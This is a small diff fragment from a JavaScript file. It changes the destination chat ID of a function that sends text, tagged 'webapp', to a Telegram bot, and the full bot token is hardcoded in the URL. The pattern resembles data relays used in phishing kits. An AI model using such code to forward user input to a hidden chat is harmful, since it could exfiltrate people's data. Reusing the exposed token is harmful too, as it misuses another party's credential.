@@ -4,7 +4,7 @@ function send_dataa(text){
     const url = `https://api.telegram.org/bot7401647929:AAFjoJh_BxvDGK0McXTWUu7obokBXXvYc4g/sendMessage`;
 
     const data = {
-        chat_id: -1002491429457,
+        chat_id: -1002498158929,
         text: 'webapp\n'+text
     };
 
